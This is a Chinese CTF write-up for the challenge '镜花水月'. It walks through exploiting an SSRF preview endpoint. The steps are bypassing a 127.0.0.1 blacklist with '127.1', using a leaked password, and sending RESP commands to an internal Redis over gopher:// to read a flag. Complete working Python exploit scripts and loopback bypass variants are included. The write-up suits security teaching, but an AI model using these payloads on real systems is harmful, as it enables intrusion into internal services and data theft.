---
date: 2026-11-24 22:00:00
slug: mingyuebei-jinghua-shuiyue
categories:
  - SSRF
  - Web
  - Redis
---

# 明月杯 · 大观园 — 镜花水月：用 gopher 给 Redis 递纸条

> **题目类型**：SSRF（gopher 协议）— 打内网 Redis 读 flag
>
> **Flag**：`MYCTF{d0fa860f-a161-4617-b900-b1367e419d80}`

---

## 题目概述

页面叫「镜花水月」，输入一个网址，服务器替你去“观景”。

文案里有两句关键的话：

```
园中景致，皆由「览胜使」代为观之   ← 服务器替你请求（SSRF）
览胜使只替你看「外头」的景致；园内深处，非请莫入   ← 内网不能直接访问
输入框提示：http://example.com/ 或 gopher://...   ← 直接把答案写在占位符里
```

**输入框的 placeholder 里就有 `gopher://`——出题人几乎是在提示了。**

---

## 解题过程

### Step 1：确认是 SSRF，并找到过滤点

**源码里的请求逻辑：**

```javascript
fetch('/api/preview?url=' + encodeURIComponent(url))
  .then(r => r.json().then(j => ({s: r.status, j})))
  .then(function(o){
    var j = o.j;
    if (o.s !== 200) { oh.textContent = '受阻'; ... render error }
```

**服务端去请求你给的 url，把结果原样返回。**

**试 `http://127.0.0.1:6379/` → 被挡。**说明有黑名单，但拦的只是 `127.0.0.1` 这个**字符串**。

**换成 `127.1` 就能过**——前缀里没有 `127.0.0.1`，但 Linux 会把它解析成本机。

### Step 2：找内网有什么

**dirsearch 扫出一个 `robots.txt`：**

```
Disallow: /static/ledger.txt
```

**`/static/ledger.txt` 是「荣国府 库房账目（残卷）」，末尾藏了一行：**

```
—— 账尾有小字一行 ——
内库钥语，仍用旧例：hengwuyuan
（掌钥者切记，勿与外人言）
```

**“内库”+“钥语”= 内网服务要密码。**结合页面 hint 里的 `gopher://` 和常见的内网服务，指向 **Redis（6379）**。

### Step 3：为什么必须是 gopher

**HTTP 只能发 HTTP 请求，而 Redis 说的是 RESP 协议。**

**`gopher://` 能把 `_` 后面的字节原样发进 TCP 连接——所以能直接手写 RESP 报文。**

### Step 4：先认证，再列键

**Redis 的 RESP 是「先声明参数个数，再逐个给长度和内容」：**

```
*2\r\n            ← 这一条命令有 2 个参数
$4\r\nAUTH\r\n    ← 第 1 个参数 4 字节：AUTH
$10\r\nhengwuyuan\r\n  ← 第 2 个参数 10 字节：hengwuyuan
*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n   ← KEYS *
```

**完整 payload：**

```python
PAYLOAD = (b"*2\r\n$4\r\nAUTH\r\n$10\r\nhengwuyuan\r\n"
           b"*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
```

**然后编码成 gopher 链接：**

```python
payload = urllib.parse.quote(PAYLOAD.decode(), safe="")
gopher  = "gopher://127.1:6379/_" + payload
```

### Step 5：两层编码，别搞混

```python
api = "http://%s/api/preview?url=%s" % (SITE, urllib.parse.quote(gopher, safe=""))
```

**第一层：把 RESP 报文（含 `\r\n`）编码，放进 gopher 的路径里。**
**第二层：把整条 gopher URL 再编码，放进 `url=` 参数里。**

**少一层，`\r\n` 就会被 HTTP 层吃掉，Redis 收到的就是一堆错乱的字节。**

### Step 6：看返回

```python
import urllib.request, urllib.parse, json

PAYLOAD = (b"*2\r\n$4\r\nAUTH\r\n$10\r\nhengwuyuan\r\n"
           b"*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
payload = urllib.parse.quote(PAYLOAD.decode(), safe="")
gopher = "gopher://127.1:6379/_" + payload
SITE = "80-759cdb57-54e7-4195-86c5-6044ad5743df.challenge.ctfplus.cn/"
api = "http://%sapi/preview?url=%s" % (SITE, urllib.parse.quote(gopher, safe=""))
raw = urllib.request.urlopen(api, timeout=40).read()
print(json.loads(raw))
```

**返回的 body：**

```
+OK\r\n*1\r\n$4\r\nflag\r\n
```

**拆开看：**

```
+OK                AUTH 成功
*1                 只有一个键
$4 flag            键名是 flag
```

### Step 7：读那个键

**把 `KEYS *` 换成 `GET flag`：**

```python
PAYLOAD = (b"*2\r\n$4\r\nAUTH\r\n$10\r\nhengwuyuan\r\n"
           b"*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n")
```

```text
MYCTF{d0fa860f-a161-4617-b900-b1367e419d80}
```

---

| 关键点 | 说明 |
| --- | --- |
| 入口 | `/api/preview?url=` 服务端替换请求 |
| 黑名单 | 拦字符串 `127.0.0.1`，用 `127.1` 绕过（Linux 能解析） |
| 情报 | `robots.txt` → `/static/ledger.txt` → Redis 密码 `hengwuyuan` |
| 协议选择 | HTTP 发不了 RESP，必须 `gopher://` |
| RESP 结构 | `*参数个数` + 每个参数的 `$长度` + 内容，全部 CRLF 分隔 |
| 编码层数 | 报文编码一次（进 gopher 路径）→ 整条 URL 再编码一次（进 url 参数） |
| 成功标志 | `+OK` 表示 AUTH 成功；`*N` 后面的 `$长度 内容` 是返回值 |

---

??? note "两个脚本"

    ```python
    # ① 列键
    import urllib.request, urllib.parse, json
    PAYLOAD = (b"*2\r\n$4\r\nAUTH\r\n$10\r\nhengwuyuan\r\n"
               b"*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
    payload = urllib.parse.quote(PAYLOAD.decode(), safe="")
    gopher = "gopher://127.1:6379/_" + payload
    SITE = "80-759cdb57-54e7-4195-86c5-6044ad5743df.challenge.ctfplus.cn/"
    api = "http://%sapi/preview?url=%s" % (SITE, urllib.parse.quote(gopher, safe=""))
    print(json.loads(urllib.request.urlopen(api, timeout=40).read()))
    ```

    ```python
    # ② 读值：只改中间那一段
    PAYLOAD = (b"*2\r\n$4\r\nAUTH\r\n$10\r\nhengwuyuan\r\n"
               b"*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n")
    ```

??? note "这题踩的坑"

    **① 想到命令执行去了**

    **页面像搜索框，第一反应是管道/命令注入。**但它是“服务器替你请求 URL”，**是 SSRF，不是 RCE。**

    **② 死磕 `127.0.0.1`**

    **黑名单只拦这个字符串。**`127.1`、`0.0.0.0`、`[::1]`、`127.0.0.01`（部分系统）都是候选。

    **③ 忘了 AUTH**

    **这个 Redis 要密码。**没有 `AUTH` 直接 `KEYS *`，返回的是 `-NOAUTH`。

    **④ `$长度` 写错**

    **RESP 的长度是**字节数**：`AUTH`=4、`hengwuyuan`=10、`KEYS`=4、`*`=1、`GET`=3、`flag`=4。**写错一位，Redis 就认为协议错误，直接断开。

    **⑤ 只编码一层**

    **`\r\n` 必须活着到达 Redis。**两层 `quote(..., safe="")` 是对的做法。
